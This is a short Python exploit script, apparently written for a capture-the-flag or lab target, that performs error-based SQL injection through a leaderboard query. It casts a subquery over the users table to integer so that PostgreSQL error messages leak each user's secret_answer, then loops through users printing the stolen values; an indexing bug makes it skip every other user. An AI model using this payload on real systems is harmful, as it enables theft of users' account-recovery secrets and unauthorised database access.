#!/usr/bin/env python3
from enchaintix_lib import User
import sys
import re
ip = sys.argv[1]
user_index = 0
u1 = User(ip)
while True:
    try:
        payload = f'''wins, CAST((SELECT CONCAT('ANSWER:', secret_answer) FROM users LIMIT 1 OFFSET {user_index}) AS INTEGER)'''
        user_index += 1
        text = u1.check_leaderboard(payload.format(0))
        match = re.search(r"invalid input syntax for type integer: \"ANSWER:([^\"]+)\"", text)
        if match:
            secret = match.group(1)
            print(f"{secret}", flush=True)
            user_index += 1
        else:
            print("[*] No more users found.")
            break
        
    except Exception as e:
        print(f"[-] Error occurred: {e}")
        break